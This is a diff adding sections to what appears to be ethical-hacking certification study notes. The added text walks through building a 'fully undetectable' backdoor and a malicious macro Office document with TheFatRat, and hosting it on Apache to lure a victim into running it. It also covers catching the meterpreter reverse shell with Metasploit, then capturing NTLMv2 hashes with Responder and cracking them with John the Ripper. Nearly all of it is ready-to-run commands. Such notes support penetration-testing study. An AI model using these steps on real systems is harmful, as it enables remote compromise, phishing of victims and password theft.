@@ -276,6 +276,40 @@ Move to the 'Snow' folder in the _cmd_.
 ## Hacking Windows Server 2012 with a Malicious Office Document ##
 
 ### TheFatRat ###
+``` fatrat ```
+1. ``` [06] Create Fud Backdoor 1000% with PwnWinds [Excelent] ```
+2. ``` [3] Create exe file with apache + Powershell ```
+3. ``` Set LHOST IP: <Attacker IP> ```, ``` Set LPORT: <Attacker Port> ```
+4. ``` payload ``` > ``` [3] windows/meterpreter/reverse_tcp ```
+5. ``` [8] Back to Menu ```
+6. ``` [07] Create Backdoor for Office with Microsploit ```
+7. ``` [2] The Microsoft Office Macro on Windows ```
+8. ``` Set LHOST IP: <Attacker IP> ```, ``` Set LPORT IP: <Attacker Port> ```, ``` Enter basename for output files: BadDoc ```, Document Body as default, ``` Are u Want to Use custom exe file backdoor (y/n): y ```, 
+9. ```Enter the path to the exe file: <Path>/output/payload.exe ```  > ``` [3] windows/meterpreter/reverse_tcp ```
+
+### Creating a Directory to Share with the Victim ###
+1. ``` mkdir /var/www/html/share ```
+2. ``` chmod -R 755 /var/www/html/share ```
+3. ``` chown -R www-data:www-data /var/www/html/share ```
+4. ``` mv /root/TheFatRat/Output/BadDoc.docm /var/www/html/share ``` - Moving the malicious file to the shared folder
+
+### Starting the Apache Server ###
+``` service apache2 start ```
+
+### Metasploit ###
+``` msfconsole ```
+
+1. ``` use exploit/multi/handler ```
+2. ``` set payload windows/meterpreter/reverse_tcp ```
+3. ``` set LHOST <Attacker IP> ```
+4. ``` show options ```
+5. ``` exploit -j -z ```
+
+### Luring the Victim ###
+Now, the attacker should lure the victim to access: ```http://<Attacker IP>/share``` and download and execute the ```BadDoc.docm``` file.
+
+### Metasploit / Meterpreter ###
+If Meterpreter does not start automatically interacting with the victim, type: ``` sessions -i 1 ```.
 
 
  - - - -
@@ -284,6 +318,13 @@ Move to the 'Snow' folder in the _cmd_.
  
  ### Responder ###
 
+1. On the attacker machine: ``` responder -I <Interface - Ex. eth0> ```
+2. On the victim machine: <kbd>Windows Key + R</kbd> > ```\\ceh-tools``` -> Will return a permission denied message, this is a spoofed message from 'Responder'
+3. Return to the attacker machine, and 'Responder' will have captured data about the victim machine and user. To view the log files: ``` /usr/share/responder/logs/ ```. Inside the logs folder, there's a file with the hashes of the users with a name similar to: ``` SMBv2-NTLMv2-SSP-<IP>.txt ```
+
+### John The Ripper ###
+
+``` john <Path to File>/<Hashes File> ``` (```john /usr/share/responder/logs/SMBv2-NTLMv2-SSP-<IP>.txt ```) - To crack the captured passwords
 
 
 
